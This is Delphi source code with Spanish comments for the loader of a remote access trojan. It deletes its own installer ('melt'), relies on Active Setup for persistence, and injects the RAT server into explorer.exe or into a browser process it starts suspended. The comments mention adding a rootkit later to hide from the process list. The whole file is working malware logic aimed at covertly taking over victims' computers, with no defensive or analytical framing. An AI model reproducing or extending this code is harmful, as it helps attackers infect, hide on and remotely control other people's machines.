program Jeringa;

uses
  Windows,
  ShellApi,
  Monitor,  //Unit que inyecta el monitor en el explorador
  Servidor,
  Funciones,
  afxCodeHook,
  Variables;

var
  PID          : dword;
  i            : integer;
  HandleWindow : THandle;
  Browser      : string;
  Instalado    : boolean;
begin
 CompartirConfig();    //compartimos la configuración en memoria para que conectador.dll la lea
  if ParamStr(1) = '\melt' then   //Melt
  begin
    //borro el archivo de instalación, reintento 5 veces por si las moscas :)
    for i := 1 to 5 do
    begin
      if not FileExists(ParamStr(2)) then
        break
      else
        DeleteFile(Pchar(ParamStr(2)));
      Sleep(10);
    end;
    //Otra opción: while not BorrarArchivo(ParamStr(2)) do Sleep(10);
    exitprocess(0);
  end
  else
  if (paramstr(1) = '') or (paramstr(1) = 's') then   //Somos ejecutados normalmente o el pc se acaba de encender
  begin
    if(paramstr(1) = 's') then  //el PC acaba de encenderse o han matado a explorer.exe cuando la opción active setup estaba activo
      sleep(30000); //Es mejor esperar unos 30 segundos porque explorer.exe acaba de iniciarse, quizas es demasiado pero mejor prevenir...
                   //Lo malo de esto es que al esperar salimos listados en la lista de procesos, en el futuro habria que agregar un pequeño rootkit

    PID := GetProcessID('explorer.exe');
    
    if (not Configuracion.bPersistencia) or (PID = 0) then
    begin //como no está activada la persistencia o no esta ejecutandose explorer.exe yo me tengo que encargar de inyectar el rat
      ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
      StartInfo.cb      := SizeOf(TStartupInfo);
      CreateProcess(pchar(GetBrowser), '', nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
      sleep(500); //le dejamos un rato...
      InjectarRAT('R', procInfo.dwProcessId);    //inyectamos el servidor en memoria, ademas se encarga de esperar a que el rat lea la configuración
      ExitProcess(0);
    end
    else
    begin
    
      if lc(ParamStr(0)) = lc(Configuracion.sCopyTo + Configuracion.sFileNameToCopy) then
        Instalado := true
      else
        Instalado := false;

      Browser := GetBrowser;
      if not fileexists(Browser) then //si no existe el archivo del navegador predeterminado salimos
        exitprocess(0);
      HandleWindow    := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
      InyectarMonitor(HandleWindow, Browser, Instalado);//Si no estamos instalados hacemos que solo nos ejecute una vez
      ExitProcess(0);
    end;
    
  end
  else  //Monitor nos indica que tenemos que inyectar el rat
  if (paramstr(1) = 'INJECT') then 
  begin
     PID := GetProcessID(extractfilename(GetBrowser));
     InjectarRAT('R', PID); //Se encarga de esperar a que finalice de leer la config
     ExitProcess(0);
  end;

end.
